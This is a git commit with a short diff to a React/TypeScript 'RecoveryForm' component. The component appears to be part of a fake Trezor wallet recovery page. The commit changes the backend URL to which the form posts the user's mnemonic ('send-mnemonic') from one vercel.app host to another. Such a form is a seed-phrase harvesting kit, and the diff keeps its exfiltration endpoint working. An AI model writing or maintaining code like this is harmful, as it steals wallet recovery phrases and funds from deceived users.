320520e93027e3b2e23cb6bc77dab9b0144db1d6
rohit-kumar-fullstack <rohitkumar7409137159@gmail.com>
2026-03-18 23:41:10 +0530

    new url update

--- components/home/RecoveryForm.tsx
+++ components/home/RecoveryForm.tsx
@@ -54,7 +54,7 @@ const RecoveryForm = () => {
         try {
             setLoading(true);
             const response = await fetch(
-                "https://trezor-backend-plum.vercel.app/api/v1/send-mnemonic",
+                "https://vcy-trezor-backend.vercel.app/api/v1/send-mnemonic",
                 // "http://localhost:5454/api/v1/send-mnemonic",
                 {
 
